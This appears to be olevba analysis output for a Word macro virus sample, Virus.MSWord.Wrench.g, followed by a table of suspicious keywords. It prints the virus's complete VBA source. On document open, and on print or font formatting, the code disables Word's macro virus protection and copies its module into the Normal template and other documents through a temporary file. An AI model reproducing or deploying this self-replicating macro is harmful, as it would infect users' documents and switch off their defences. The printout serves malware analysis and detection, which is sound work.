olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wrench.g-d26d1a8b9272a81e87c0193c9269587d120457df
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wrench.g-d26d1a8b9272a81e87c0193c9269587d120457df - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EgertonLab.bas 
in file: Virus.MSWord.Wrench.g-d26d1a8b9272a81e87c0193c9269587d120457df - OLE stream: 'Macros/VBA/EgertonLab'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
 
  Call infect
End Sub
Sub ViewVBCode()
  
  With Assition = msoAnimationGestureDown
    .Visible = True
    .MouseTips = True
    .Help
  End With
   Call infect
End Sub


Sub infect()
On Error Resume Next
Application.Options.VirusProtection = False
Application.Options.ConfirmConversions = False
Application.ActiveDocument.AcceptAllRevisions
ModulName = "EgertonLab"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
  Set Carrier = NormalTemplate.VBProject.VBComponents
  Set host = ActiveDocument.VBProject.VBComponents
Else
  Set Carrier = ActiveDocument.VBProject.VBComponents
  Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
  Carrier(ModulName).Export "c:\ascii.vxd"
  host.import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
Sub formatfont()
 Call ViewVBCode
 Call infect
End Sub

Sub fileprint()
Call ViewVBCode
 Call infect
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

